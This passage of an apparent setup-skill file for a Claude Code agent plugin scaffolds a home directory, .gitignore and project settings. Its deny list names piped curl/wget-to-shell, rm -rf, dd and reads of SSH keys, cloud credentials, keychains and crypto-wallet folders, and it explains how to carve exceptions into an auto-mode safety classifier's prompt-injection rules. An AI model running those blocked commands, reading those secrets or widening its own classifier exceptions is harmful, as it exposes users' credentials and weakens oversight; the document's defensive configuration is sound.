    "$HOME_DIR"/*) echo "${1#$HOME_DIR/}" ;;
    *) echo "$1" ;;
  esac
}
KNOWLEDGE_REL="$(relpath "$KNOWLEDGE_ROOT")"
PROJECTS_REL="$(relpath "$PROJECTS_ROOT")"
AGENT_NAME="<the name staged in Step 1b — literal, e.g. Kevin>"
# {{SHELL}} fills the Toolchain "Shell:" line per OS. On Windows, Claude Code's Bash tool runs under
# Git Bash (POSIX), not PowerShell, so Kevin's commands assume bash everywhere.
case "$KEVIN_OS" in
  macos)   SHELL_NOTE='zsh, Homebrew at `/opt/homebrew`' ;;
  windows) SHELL_NOTE='Git Bash (the POSIX shell Claude Code uses for its Bash tool on Windows)' ;;
  wsl)     SHELL_NOTE='bash (WSL2)' ;;
  *)       SHELL_NOTE='bash' ;;
esac
sed -i.bak \
  -e "s|{{KNOWLEDGE_REL}}|${KNOWLEDGE_REL}|g" \
  -e "s|{{PROJECTS_REL}}|${PROJECTS_REL}|g" \
  -e "s|{{PLATFORM}}|${PLATFORM_LABEL}|g" \
  -e "s|{{SHELL}}|${SHELL_NOTE}|g" \
  -e "s|{{AGENT_NAME}}|${AGENT_NAME}|g" \
  "$CLAUDE_DEST"
rm "$CLAUDE_DEST.bak"
```

- `$CLAUDE_DEST` ← `cp ${CLAUDE_PLUGIN_ROOT}/templates/CLAUDE.md` then placeholder-substituted so `@-imports` point at the active `KNOWLEDGE_ROOT` / `PROJECTS_ROOT`

**Gate: no placeholder may survive into the home.** `CLAUDE.md` is substituted by the
`sed` above, but `SOUL.md`, `IDENTITY.md` and `USER.md` are staged by you and written
with `Write`, so nothing mechanical guarantees you resolved their placeholders. Check,
right after the four files land:

```bash
grep -l '{{' "$HOME_DIR"/{SOUL,IDENTITY,USER}.md "$CLAUDE_DEST" 2>/dev/null
```

One pattern covers all four because every placeholder written into the home uses
`{{TOKEN}}` — the bundled `templates/*.md` and the `USER.md` body written inline in this
skill alike. Keep it that way: `<TOKEN>` is this skill's convention for values *you*
fill in while following instructions, and it must never reach a file in the home, or the
SessionStart backstop that re-checks this every session will not see it either.

Any file listed still has an unresolved placeholder. Fix it before continuing — an
unsubstituted `{{AGENT_NAME}}` sits in the agent's own identity files and is read into
context every session from then on.

If `COLLISION="yes"`, note this for the Step 9 status block so the user knows Kevin wrote to `CLAUDE.local.md`. Claude Code auto-loads `.local.md` files alongside the main `CLAUDE.md`, so the user's existing instructions and Kevin's coexist — Kevin's `@-imports` cascade still pulls in the identity stack.

Write a `.gitignore` so the home dir is safe to track in git out of the box. **Collision-aware**: if one already exists, don't overwrite — but append the Kevin-critical entries (`.claude/settings.local.json` holds local config, `.kevin/*` ignores the secrets dir + runtime tokens + logs while **tracking the `knowledge.json` compile cursor and the `version.json` template baseline**, `.obsidian/workspace.json` churns on every Obsidian pane move) if they aren't already covered. The first two must be gitignored or the user will leak secrets (`.kevin/secrets/` lives under `.kevin/*`) / churn on every Kevin run; the third saves the operator from a dirty working tree every time they open the vault.

Two records inside `.kevin/` must survive a clone or restore, so we un-ignore them while keeping the rest (tokens, logs) ignored: the compile cursor (`.kevin/knowledge.json`) is the *only* record of what's been ingested — rolled back (iCloud, restore, fresh clone), the next blind compile re-ingests everything and corrupts memory; the template baseline (`.kevin/version.json`) records which plugin version this home's scaffolded files are reconciled to — lost, upgrade-tracking resets to onboarding and the "you're behind" signal breaks.

```bash
if [ ! -f "$HOME_DIR/.gitignore" ]; then
  cp "${CLAUDE_PLUGIN_ROOT}/templates/.gitignore" "$HOME_DIR/.gitignore"
else
  # Existing .gitignore — append Kevin-critical entries if missing.
  # Upgrade a legacy bare `.kevin/` (ignores the cursor too) to the
  # cursor-tracking pattern: drop the line, the APPEND below re-adds it.
  if grep -qxF ".kevin/" "$HOME_DIR/.gitignore"; then
    grep -vxF ".kevin/" "$HOME_DIR/.gitignore" > "$HOME_DIR/.gitignore.tmp" && mv "$HOME_DIR/.gitignore.tmp" "$HOME_DIR/.gitignore"
  fi
  APPEND=""
  # The Claude Code Bash tool runs commands through an eval wrapper where '!' is
  # unusable — a literal leading '!' is mangled to '\!', and the '!' negation
  # operator errors ("command not found: !"). So: no '!' negation (positive grep +
  # else for the fresh case), grep '!'-free substrings, emit '!' via octal \041.
  BANG=$(printf '\041')
  grep -qxF ".claude/settings.local.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.claude/settings.local.json"$'\n'
  if grep -qxF ".kevin/*" "$HOME_DIR/.gitignore"; then
    # Already ignores .kevin/* — re-add either negation if a legacy init missed it.
    grep -qF "kevin/knowledge.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}${BANG}.kevin/knowledge.json"$'\n'
    grep -qF "kevin/version.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}${BANG}.kevin/version.json"$'\n'
  else
    # Fresh: ignore runtime state, but track the two records that must survive a clone.
    APPEND="${APPEND}.kevin/*"$'\n'"${BANG}.kevin/knowledge.json"$'\n'"${BANG}.kevin/version.json"$'\n'
  fi
  grep -qxF ".obsidian/workspace.json" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.obsidian/workspace.json"$'\n'
  grep -qxF ".obsidian/cache/" "$HOME_DIR/.gitignore" || APPEND="${APPEND}.obsidian/cache/"$'\n'
  if [ -n "$APPEND" ]; then
    printf '\n# agent-kevin\n%s' "$APPEND" >> "$HOME_DIR/.gitignore"
  fi
fi
```

Match is exact-line (`grep -xF`) — so `.kevin/*` won't false-match on `!.kevin/knowledge.json` or a partial substring, and the negation must follow the `.kevin/*` line (git can't re-include a file whose parent dir is ignored, so order matters). The full template (when written fresh) also ignores secrets (`.env*`, `keys.json`, `*.pem`, `*.key`, `certificates/`) and OS cruft (`.DS_Store`, `Thumbs.db`); on collision we trust the user's existing patterns for those and only enforce the Kevin-specific entries.

Write project settings so the plugin auto-loads on subsequent launches AND the **always-on core** MCP tools are pre-granted (no per-call confirm prompts). Pack-gated tools are NOT granted here — they land in `permissions.allow` only when the matching `configure-skills` walk runs (Step 8 inline or `/agent-kevin:configure-skills` later).

- `$HOME_DIR/.claude/settings.json` ← JSON below, with `<PLUGIN_PATH>` substituted with the absolute value of `${CLAUDE_PLUGIN_ROOT}`.

**`plansDirectory` — unify plan-mode with reports.** Claude Code writes plan-mode artefacts to the path in `plansDirectory` (default `./.claude/plans`). Kevin's `self-review` skill also writes code-change plans under `<REPORTS_ROOT>/plans/`, so we point the harness at the same folder — one home for every plan. Compute it from the reports path resolved in Step 7: `./reports/plans` when `REPORTS_ROOT` is the default under `$HOME_DIR`, else the absolute `<REPORTS_ROOT>/plans`. **Preserve any pre-existing value**: if the project `settings.json` already has a `plansDirectory`, omit the key from the scaffold and let the deep-merge below keep the operator's choice. (Note: `self-review`'s age-sweep filters to its own plans by frontmatter `skill: self-review`, so raw plan-mode dumps sharing the folder are ignored — see that skill.)

**Fill hardening gaps the operator's user-global settings don't cover.** Kevin ships a baseline of security + quality defaults (denies, sandbox, effort, traffic kill, retention, render, Haiku-tier remap). Most operators won't have these in their user-global `~/.claude/settings.json` — for them, init must write the baseline into project settings so the protection is actually in effect. Operators who *do* already have these globally shouldn't get the same keys duplicated into the project — global already covers them, and re-writing them in project is redundant churn.

**Logic: gap-fill, not mirror.** Before writing the scaffold, `Read` `~/.claude/settings.json` (treat as empty `{}` if absent). For each baseline key below, check whether the operator already has it globally. If global covers it, **omit the key from the project scaffold** — inheritance handles it. If global does not cover it, **write the baseline value into the project scaffold**. Each `env.*` key is gap-filled independently; if all three are covered globally, omit the entire `env` block rather than writing an empty `{}`.

| Project-scaffold key | Baseline value to write when global is missing it | "Already covered" test against global |
|---|---|---|
| `cleanupPeriodDays` | `99999` | Any non-empty `cleanupPeriodDays` set globally |
| `effortLevel` | `"high"` | Any non-empty `effortLevel` set globally |
| `env.CLAUDE_CODE_NO_FLICKER` | `"1"` | Global `env.CLAUDE_CODE_NO_FLICKER` set to any truthy string |
| `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` | `"1"` | Global `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` set to any truthy string |
| `env.ANTHROPIC_DEFAULT_HAIKU_MODEL` | `"claude-sonnet-4-6"` | Any non-empty `env.ANTHROPIC_DEFAULT_HAIKU_MODEL` set globally |
| `permissions.deny` | The full deny list below | Global `permissions.deny` is non-empty (any deny suggests the operator is curating their own — don't fight it) |
| `sandbox` | The full sandbox block below | Global `sandbox.enabled === true` (sandbox is binary — if globally enabled, project doesn't need its own) |

**`model` is not gap-filled.** It carries the operator's explicit Step 6c answer (`"fable"` or `"opus"`) and is always written to the project scaffold — an explicit wizard choice outranks the global setting and, on re-init, the prior project value.

**⚠ The traffic kill suppresses auto mode's built-in default.** `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` disables feature-flag fetching, and Claude Code only engages its built-in auto-mode default when flags are reachable — so a home carrying this env (or an operator carrying it globally) silently starts every session in Manual and drowns in static-matcher prompts, with nothing on screen saying why. This is not a reason to drop the traffic kill: the printed user-settings block in the auto-mode section below carries an explicit `permissions.defaultMode: "auto"`, which bypasses the built-in default entirely and survives the flag being off. If an operator reports constant permission prompts, check this interaction first.

Baseline `permissions.deny` to write when global doesn't already have a deny list. It has a **cross-platform core** plus an **OS-specific tail** (credential store + crypto-wallet dirs, which live in different places per OS). Concatenate the core with the tail selected by `$KEVIN_OS` from Step 0 — never ship the macOS `~/Library/...` paths on a Windows/Linux/WSL home, where they're dead entries that protect nothing. (On native Windows, `$KEVIN_OS` is `windows` and the Windows `~/AppData/...` tail below applies.)

Cross-platform core (always written). The `~/.ssh`, `~/.aws`, etc. entries resolve correctly on Windows too, since Git Bash maps `~` to `%USERPROFILE%`:

```json
[
  "Bash(rm -rf *)",
  "Bash(rm -fr *)",
  "Bash(sudo *)",
  "Bash(mkfs *)",
  "Bash(dd *)",
  "Bash(wget *|bash*)",
  "Bash(wget *| bash*)",
  "Bash(git push --force*)",
  "Bash(git push *--force*)",
  "Bash(git reset --hard*)",
  "Bash(curl *|sh*)",
  "Bash(curl *| sh*)",
  "Edit(~/.bashrc)",
  "Edit(~/.zshrc)",
  "Read(**/.env)",
  "Read(**/.env.local)",
  "Read(**/.env.*.local)",
  "Read(**/.env.development)",
  "Read(**/.env.production)",
  "Read(**/.env.staging)",
  "Read(**/.env.test)",
  "Read(//**/.kevin/secrets/**)",
  "Read(**/secrets/**)",
  "Read(**/credentials/**)",
  "Read(**/*.pem)",
  "Read(**/*.key)",
  "Read(~/.ssh/id_*)",
  "Read(~/.ssh/*.pem)",
  "Read(~/.ssh/authorized_keys)",
  "Edit(~/.ssh/id_*)",
  "Edit(~/.ssh/*.pem)",
  "Edit(~/.ssh/authorized_keys)",
  "Read(~/.gnupg/**)",
  "Read(~/.aws/**)",
  "Read(~/.azure/**)",
  "Read(~/.git-credentials)",
  "Read(~/.docker/config.json)",
  "Read(~/.kube/**)",
  "Read(~/.npmrc)",
  "Read(~/.npm/**)",
  "Read(~/.pypirc)",
  "Read(~/.gem/credentials)"
]
```

OS-specific tail — append the block matching `$KEVIN_OS`:

`macos`:

```json
[
  "Read(~/Library/Keychains/**)",
  "Read(~/Library/Application Support/**/metamask*/**)",
  "Read(~/Library/Application Support/**/electrum*/**)",
  "Read(~/Library/Application Support/**/exodus*/**)",
  "Read(~/Library/Application Support/**/phantom*/**)",
  "Read(~/Library/Application Support/**/solflare*/**)"
]
```

`linux` / `wsl`:

```json
[
  "Read(~/.local/share/keyrings/**)",
  "Read(~/.config/**/electrum*/**)",
  "Read(~/.config/**/exodus*/**)",
  "Read(~/.config/**/Exodus/**)"
]
```

`windows` (Git Bash maps `~` to `%USERPROFILE%`, so these `~/AppData/...` globs resolve to `%APPDATA%` / `%LOCALAPPDATA%`):

```json
[
  "Read(~/AppData/Roaming/Microsoft/Credentials/**)",
  "Read(~/AppData/Local/Microsoft/Vault/**)",
  "Read(~/AppData/Roaming/**/electrum*/**)",
  "Read(~/AppData/Roaming/Exodus/**)",
  "Read(~/AppData/Roaming/**/exodus*/**)",
  "Read(~/AppData/Local/**/metamask*/**)"
]
```

For `unknown`, write the core only (no tail). The OS tail is best-effort wallet-folder coverage — names vary by app version, so don't treat absence as a guarantee.

Baseline `permissions.ask` — **always written** (unioned with whatever the operator already has), unlike `deny` which yields to a curated global list:

```json
[
  "Bash(git push)",
  "Bash(git push *)",
  "Bash(gh pr create *)",
  "Bash(gh pr merge *)",
  "Bash(gh release create *)",
  "mcp__plugin_agent-kevin_kevin__curl_run"
]
```

**Why `ask` and not a conversational rule.** Since Claude Code v2.1.228 (v2.1.233 on native Windows), Pro/Max/Team users start interactive sessions in **auto mode**, where a separate classifier model reviews each action instead of prompting. The classifier's built-in `soft_deny` covers *destructive* git (force push, deleting remote branches/tags/releases, amending pushed commits) but a plain `git push` is approved without a prompt — and `soft_deny` itself yields to explicit user intent. An `ask` rule is evaluated **before** the classifier and cannot be auto-approved past, in any mode. That makes it the only durable form of "nothing leaves this machine without a human", which a CLAUDE.md sentence can't guarantee once context compacts.

The list is deliberately short. Every entry is an action that publishes something outside the machine; volume is what trains operators to blind-click, so resist growing it. Force-push and `reset --hard` stay in `deny` rather than `ask` — those are unrecoverable, and `deny` is the only tier nothing overrides.

`curl_run` is the one sanctioned execution path in the `api-collections` skill and is deliberately never granted into `permissions.allow` by any pack walk, precisely so it always prompts. The `ask` entry is what keeps that promise once auto mode is deciding — without it, the classifier can approve an outbound request on its own.

**Auto mode cannot be configured from here.** `permissions.defaultMode: "auto"` and the whole `autoMode` block are **ignored** in `.claude/settings.json` and `.claude/settings.local.json` (since v2.1.142 and v2.1.207 respectively) — both files live in a repo, so a checked-in settings file could otherwise inject its own classifier allow rules. They only take effect from `~/.claude/settings.json` or managed settings. Init must **not** write either key, and must not touch the operator's user-global settings to set them: auto mode is already the built-in default for the plans that support it, and a global write would reach every project on their machine, not just this home.

### Offer the auto-mode knowledge-base exception (print only, never write)

Auto mode's classifier ships an allow exception for **`~/.claude/projects/*/memory/`** and one for **`CLAUDE.md`**. This home deliberately uses neither: memory routes to `knowledge/`, and identity lives in `SOUL.md` / `IDENTITY.md` / `USER.md` / `.claude/rules/`. Meanwhile the classifier's `soft_deny` list carries **Instruction Poisoning** — writing to any file a session reads back as instructions. That describes this agent's core loop, so on the shipped defaults a compile or memory write can read as an attack on the agent rather than as the agent working.

The fix is a small `autoMode` block in the operator's **user-global** settings: a mode line, an environment anchor, two allow exceptions, and two soft-denies (outbound push, identity-file replacement — the latter because an exclusion from an allow blocks nothing on its own; a git-recoverable replacement matches no default block rule). Print the block below in the Step 9 summary as an optional copy-paste, flag the tradeoff in one line, and move on. **Do not write it, do not offer to write it, and do not gate the summary on it** — the operator may be on a plan or platform where the classifier isn't available, in which case it's inert.

The `defaultMode` line matters as much as the sentences: the *built-in* auto default is fragile — it needs Pro/Max/Team OAuth, reachable feature flags (which the traffic-kill env above turns off), and it skips the first session after every update. The explicit setting bypasses all of that. Without it most operators are never in auto mode at all, and the sentences do nothing.

```json
{
  "permissions": {
    "defaultMode": "auto"
  },
  "autoMode": {
    "environment": [
      "$defaults",
      "Agent homes: <HOME_DIR> — a session started anywhere under this path is an agent-home session; the custom rules key off this entry",
      "Outbound posture: agent homes gate every outbound action (git push, PR creation or merge, release publication) on a human naming it in the session; unattended sessions started in an agent home do not push",
      "Additional trusted repo (extends, not replaces, the default Trusted repo entry): the agent home at <HOME_DIR> — a local git repository that version-controls this agent's markdown knowledge base and identity files"
    ],
    "allow": [
      "$defaults",
      "Agent Knowledge Base: Routine writes, edits, individually-named-file deletes, and local git commits under the agent home this session started in (per the Agent homes entry in Environment) — its knowledge/, projects/, and reports/ trees, its generated root surfaces (dashboard.html, roadmap.html — local files opened from disk, never served or published), and its root identity files (SOUL.md, IDENTITY.md, USER.md) — are the agent's core function: recording preferences, project facts, session notes, decisions, and task state. Full-file rewrites under these trees are part of that function — the compile loop regenerates whole articles, and any knowledge file may be rewritten wholesale. The home is a git repository that tracks these trees by design, so presume files under them tracked unless the transcript shows otherwise; an overwrite may still cost an uncommitted working-tree delta, an accepted residual of this workflow, and a file shown to be untracked is judged under Irreversible Local Destruction as usual. The presumption reaches tracked files only: a path the home's .gitignore excludes even though it sits inside these trees (capture artifacts, scratch, runtime state) has no history behind it and is judged under that rule like any other untracked file. That residual is bounded per file: rewriting more than three files wholesale in a single action, or looping or globbing over a directory to rewrite it, with no intervening commit, is outside the routine pattern and is judged on its own terms — as is a run of actions that together rewrite most of a tree with no intervening commit, which the per-action count would otherwise wave through three files at a time. Provided the content neither changes permissions, authorizations, or auto-mode behaviour, nor fabricates user authorization, consent, or approval, nor records classifier workarounds or instructions steering a future session toward a blocked action, treat these writes exactly as the built-in Memory Directory and CLAUDE.md Content exceptions treat their paths: not Instruction Poisoning, not Self-Modification, and not Irreversible Local Destruction (subject to the tracking presumption above). Identity files are covered for incremental changes only, and the test is magnitude rather than structure: an Edit to SOUL.md, IDENTITY.md, or USER.md is covered when its removes span a small part of the file body, and an Edit whose removes go beyond a small part is a replacement however many section headings survive (the Identity File Replacement rule uses the same threshold, so there is no middle band). When the file's length is not visible in the transcript, judge that threshold in absolute terms rather than as a proportion: removes confined to a few lines or one short passage are covered, while removes spanning many lines or reaching across sections are not. A full-file write is covered only when the file's prior content is visible earlier in the transcript and the write retains both its existing section headings and most of its prose. Whatever the classifier cannot see is a replacement: a full-file write with no visible prior content, and an Edit whose removes are truncated, both fall outside this exception — deliberately fail-closed, since evidence that never reached the classifier cannot establish what the file held. Any deletion, move, or rename of those files is likewise not covered, whichever tool performs it (see the Identity File Replacement rule, which gates these). Also outside the exception entirely: anything under .claude/ (rules, settings, hooks); content leaving the home or written to any other agent home; and deletion by directory, pattern, or glob — all evaluated on their own terms.",
      "Agent Home Multi-Repo Scope: A session started in an agent home (per the Agent homes entry in Environment) routinely works across the code repositories Environment lists under source control — moving between them is intended scope, not escalation. Covers ordinary reads, edits, builds, and commits in those repositories, and clears nothing else: every other block rule, hard or soft, applies as usual; pushes are deliberately not covered; and the content rules still judge what is written — routine mirroring between listed repositories never blesses the mirrored content itself (Instruction Poisoning applies to skill and instruction files wherever they are copied). This rule never reaches an agent home: the session's own home is governed by the Agent Knowledge Base exception, and any other agent home lies outside both rules, judged on its own terms however Environment lists it. Reaching outside the listed repositories is still scope escalation."
    ],
    "soft_deny": [
      "$defaults",
      "Agent Home Outbound Push [named+specifics — must name: the outbound action (push / PR create / PR merge / release) and its destination repo, plus the branch for pushes]: Any git push, PR creation or merge, or release publication from a session started in an agent home (per the Agent homes entry in Environment) — including pushes to any other repository the session works in. The built-in Git Push Destination exception does not apply to sessions started in an agent home; this rule governs all pushes there. Agent homes gate outbound actions on a human: listing a repository as trusted or under source control trusts it for reads, edits, builds, and commits — not for unattended pushes. An outbound action the user named, with its destination, in this session is fine — though this rule's bar is cumulative with other rules' own bars (a named PR merge must still clear Merge Without Review, for example).",
      "Identity File Replacement [named+specifics — must name: the file and the replacement or deletion itself]: Replacing, deleting, moving, or renaming SOUL.md, IDENTITY.md, or USER.md at the root of an agent home (per the Agent homes entry in Environment), and any edit to one whose removes go beyond a small part of the file body, however many section headings survive — judged in absolute terms (many lines, or reaching across sections) whenever the file's length is not visible in the transcript. These files are the agent's persistent identity, read back as instructions every session; git recoverability does not make their replacement routine.",
      "Cross-Agent Home Write [named+specifics — must name: the target home and the file]: Any write, edit, or delete from a session started in one agent home into a different agent home (per the Agent homes entry in Environment), however small the change and whatever the content. Each agent's knowledge base and identity files are read back as instructions by that agent's own future sessions, so one agent editing another's brain is an influence path even when the content grants no permission. Mirroring between the agents' plugin repositories is not this: those are code repositories listed under source control, not agent homes."
    ]
  }
}
```

**Substitute `<HOME_DIR>` with the home's real absolute path when printing.** The two allow sentences anchor on "an agent home named in Environment" — without the `environment` line they dangle, and any directory with a `knowledge/` tree could claim the exception. The SKILL.md source stays path-free (it ships to every home), but the printed output goes only to this operator's terminal, so interpolating their path there leaks nothing. An operator running several agent homes extends the `Agent homes:` entry with each home's path and appends one `Additional trusted repo:` line per home into the same `environment` array, rather than pasting the whole block twice; the knowledge-base exception self-scopes to the home the session started in, so listing every home does not let one agent write another agent's brain under the exception.

**Keep the block free of every other operator-specific value.** No org names, no domains — a real org name in plugin material is a ring-boundary leak. The second sentence deliberately delegates to whatever the operator has under `environment` → **Source control**, so it stays correct for a home with none configured (it simply matches nothing). Note the built-in Source control slot resolves to *the session's starting repo and its remotes only* — and Data Exfiltration is a **hard** rule no allow sentence can clear, so cross-repo work (e.g. mirroring between two plugin checkouts) is only inside the trust boundary once the operator lists those repos in `environment` themselves. If they want that, tell them to add `Additional source-control repos:` lines naming their repos and run `claude auto-mode critique` to review the result; which repos to trust is their call, not init's. Phrase custom entries as *additions* — reusing a default slot name verbatim (`Source control:`, `Trusted repo:`) reads as contradicting the default entry, which stays in effect under `$defaults`. Those lines should enumerate repositories individually by remote (`org/repo`), not by directory prefix and not by vague phrase: "the plugin repos" resolves to nothing, and a prefix like `~/Developer/Acme/` silently extends trust to anything cloned there later, which is a boundary the agent can widen by itself. When the agent itself performs cross-repo work — mirroring changes between two checkouts, say — the line should state that explicitly, since agent-performed cross-repo copies are otherwise a hard-rule suspicion the classifier can't talk itself out of. It should also say which sessions drive that work (e.g. "driven only from agent-home sessions"): the multi-repo blessing applies only to sessions started in an agent home, so a mirror described as routine but driven from a developer-repo session would still read as scope escalation.

**Why `.claude/rules/` is excluded from the exception** (it was covered in an earlier draft): rules files are loaded as instructions at startup — exactly the Instruction Poisoning surface — and a mandatory allow would put the classifier in the position of content-judging every write to them. Legitimate rule edits are rare and operator-requested; they can afford ordinary evaluation.

**Why the push rule is a `soft_deny`, not just an omission from the allow.** The classifier's default is ALLOW: leaving pushes out of an exception does not gate them, and once the operator lists repos under Source control, most push-shaped blocks stop matching. The soft_deny restates the home's doctrine — nothing leaves the machine without a human naming it — at the classifier layer, and it is the only gate on a home where the project `permissions.ask` write failed (the upgrade's fail-soft path). Explicit user intent clears a soft_deny, which is exactly the intended semantics: the user names the push and destination, it goes. Its Git Push Destination override is best-effort, though: exceptions are mandatory when they apply, and a deny-side rule declaring a default exception inapplicable is a precedence conflict the classifier resolves on its own (a default exception can't be subtracted without dropping `$defaults` wholesale, which discards every built-in rule). That is why the project `permissions.ask` list stays the primary gate — it is evaluated before the classifier and cannot be approved past. The Environment posture line is a second anchor for the same fact, stated as context rather than as a rule.

**Consequence worth stating to the operator: an unattended session in an agent home can never push.** A scheduled or heartbeat run has no human to name the action, so it cannot clear either gate. That suits this home, where sync commits the brain locally and never pushes. An operator whose automation genuinely must push (a backup mirror, say) adds a narrow Environment line naming that one remote as automated, rather than widening the rule.

**State the tradeoff in one line, not a lecture:** Instruction Poisoning is a genuine prompt-injection defense, and exempting the knowledge tree lowers it. The carve-out above excludes config, permission/auto-mode content, fabricated consent, cross-home writes, content leaving the home, and anything beyond per-file deletion, mirroring how the built-in `CLAUDE.md Content` exception handles the same risk. `claude auto-mode reset` removes the block entirely, so trying it is cheap and reversible.

Deny + ask + allow in project scope remains the entire lever init itself has, and it's the correct one.

Baseline `sandbox` block to write when global `sandbox.enabled !== true`:

```json
{
  "enabled": true,
  "failIfUnavailable": true,
  "autoAllowBashIfSandboxed": true,
  "allowUnsandboxedCommands": false,
  "filesystem": {
    "denyRead": [".kevin/secrets"],
    "allowWrite": "<[CODE_ROOT] when the code tree is outside the home — see below; omit the key otherwise>"
  },
  "credentials": {
    "files": [{ "path": ".kevin/secrets", "mode": "deny" }]
  },
  "network": {
    "allowedDomains": [
      "github.com",
      "api.github.com",
      "raw.githubusercontent.com",
      "objects.githubusercontent.com",
      "registry.npmjs.org",
      "*.npmjs.org",
      "docs.anthropic.com",
      "docs.claude.com"
    ]
  }
}
```

The `filesystem.denyRead` directory entry is the **second** layer protecting secrets: it
blocks `cat`/`grep` of `.kevin/secrets/` via the **Bash** tool, which a `permissions.deny
Read(...)` rule does **not** cover (that gates the Read tool only). It points at the
directory (no glob) so the OS denies it and everything under it — a `**/.kevin/secrets/**`
glob would miss, because gitignore-style `**` won't descend into the `.kevin` dot-dir. The
`credentials.files` entry applies the same file-read block (and is the home for env-var
unsetting) on Claude Code v2.1.187+, and is ignored on older versions. Both the Read-tool
and sandbox layers are needed. (Sandbox is unavailable on native Windows — there the
Read-tool deny is the only layer; flag that secrets aren't OS-protected on Windows.)

**Reaching the code tree when it lives outside the home.** Under the convention the home is a standalone vault and repos live in a separate tree, so a session launched in the home reaches code across a directory boundary. Two grants make that work, and both are needed — they cover different tools:

```bash
CODE_ROOT=""
case "$AGENT_CODE_PATH" in
  "") ;;                                  # no code path — skip both grants
  "$HOME_DIR"/*) ;;                       # legacy nested layout — cwd already covers it
  *) CODE_ROOT=$(dirname "$AGENT_CODE_PATH") ;;
esac
```

When `CODE_ROOT` is non-empty, add both to the scaffold:

- `permissions.additionalDirectories: ["<CODE_ROOT>"]` — the Read/Edit/Write tools use the permission system, not the sandbox.
- `sandbox.filesystem.allowWrite: ["<CODE_ROOT>"]` — sandboxed Bash writes only to cwd + session temp by default, so without this `git commit`, package installs, and test runs inside a repo all fail.

**Grant the code root, not the single repo.** Sibling worktrees live beside the main checkout, and an operator who splits their home's git dir (`git init --separate-git-dir`, so the vault holds only a `.git` pointer) keeps the git internals in that same tree — narrowing the path to one repo silently breaks `git add`/`git commit` on the agent's own knowledge. This grant restores exactly what a nested layout gave implicitly (everything under cwd was writable); it doesn't widen beyond it. Mention it in one line during Step 9's summary so the operator knows the code tree is writable.

**Do not** touch global keys outside this baseline (`hooks`, `statusLine`, `theme`, `verbose`, other `env.*` entries, other `permissions.allow` entries, `enabledPlugins`) — those are operator-personal, not project-security. Hooks especially: plugin hooks come from `hooks/hooks.json` once registered; mirroring global hooks here would double-fire.

**Critical — never overwrite an existing project `settings.json`.** If `$HOME_DIR/.claude/settings.json` already exists (re-init, or the home was a pre-existing project), `Read` it first and **deep-merge** the scaffold into it. The merged JSON is what gets written back. Rules:

- **Scalars** (`effortLevel`, `cleanupPeriodDays`, `plansDirectory`, `$schema`, `env.*` string values): existing project value wins. Skip the key when merging — don't replace. Exception: `model` — the Step 6c answer wins even over an existing project value (the operator just chose it this run).
- **Arrays** (`permissions.allow`, `permissions.deny`, `permissions.ask`, `permissions.additionalDirectories`, `sandbox.network.allowedDomains`, any `allowWrite`/`denyRead` arrays): union with the operator's existing entries + dedupe. `sandbox.credentials.files` is an object-array — union + dedupe by `path`. Don't reorder or remove anything they already had.
- **Objects** (`permissions`, `sandbox`, `sandbox.network`, `enabledPlugins`, `env`, `hooks`): recurse with the same rules.
- **`enabledPlugins`**: special case — set `"agent-kevin@agentlayer": true` even if the key already exists with a different value (the operator just ran init, so they want it enabled). Other plugin entries pass through untouched.
- **`hooks`**: never touch — operator-owned end-to-end. The scaffold doesn't author any hooks block.

Concrete approach: `Read` the existing file (treat as `{}` if absent), build the merged object in-memory per the rules above, then `Write` the full merged JSON back. Do not invoke `jq` or shell tooling for the merge — the orchestrator has the file content already and can deep-merge cleanly without subshell escaping risks.

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "plansDirectory": "<\"./reports/plans\" (or \"<REPORTS_ROOT>/plans\" when relocated) if no existing project value, else omit and preserve>",
  "cleanupPeriodDays": "<99999 if global doesn't set it, else omit>",
  "model": "<the Step 6c answer: \"fable\" or \"opus\" — always written>",
  "effortLevel": "<\"high\" if global doesn't set it, else omit>",
  "env": {
    "CLAUDE_CODE_NO_FLICKER": "<\"1\" if global doesn't set it, else omit this key>",
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "<\"1\" if global doesn't set it, else omit this key>",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL": "<\"claude-sonnet-4-6\" if global doesn't set it, else omit this key>"
  },
  "sandbox": "<full baseline sandbox block above if global.sandbox.enabled !== true, else omit>",
  "enabledPlugins": {
    "agent-kevin@agentlayer": true
  },
  "permissions": {
    "deny": "<full baseline deny list above if global has no permissions.deny, else omit>",
    "ask": "<the full baseline ask list above — always written, unioned with any existing entries>",
    "additionalDirectories": "<[CODE_ROOT] when the code tree is outside the home — see above; omit the key otherwise>",
    "allow": [
      "Bash(cat *)",
      "Bash(date)",
      "Bash(date *)",
      "Bash(echo *)",
      "Bash(find *)",
      "Bash(git config user.email)",
      "Bash(git config user.name)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git status)",
      "Bash(git status *)",
      "Bash(ls)",
      "Bash(ls *)",
      "Bash(mkdir -p *)",
      "Bash(readlink *)",
      "Bash(test *)",
      "mcp__plugin_agent-kevin_kevin__capture",
      "mcp__plugin_agent-kevin_kevin__compile_next",
      "mcp__plugin_agent-kevin_kevin__compile_status",
      "mcp__plugin_agent-kevin_kevin__compile_write",
      "mcp__plugin_agent-kevin_kevin__dashboard",
      "mcp__plugin_agent-kevin_kevin__knowledge_lint",
      "mcp__plugin_agent-kevin_kevin__links_rewrite",
      "mcp__plugin_agent-kevin_kevin__memory_prune",
      "mcp__plugin_agent-kevin_kevin__ping",
      "mcp__plugin_agent-kevin_kevin__report_write",
      "mcp__plugin_agent-kevin_kevin__run_upgrade",
      "mcp__plugin_agent-kevin_kevin__setup_worktree",
      "mcp__plugin_agent-kevin_kevin__task_close",
      "mcp__plugin_agent-kevin_kevin__task_create",
      "mcp__plugin_agent-kevin_kevin__task_get",
      "mcp__plugin_agent-kevin_kevin__task_query",
      "mcp__plugin_agent-kevin_kevin__task_scan",
      "mcp__plugin_agent-kevin_kevin__task_thread",
      "mcp__plugin_agent-kevin_kevin__task_update",
      "mcp__plugin_agent-kevin_kevin__video_frames",
      "Skill(agent-kevin:dashboard)",
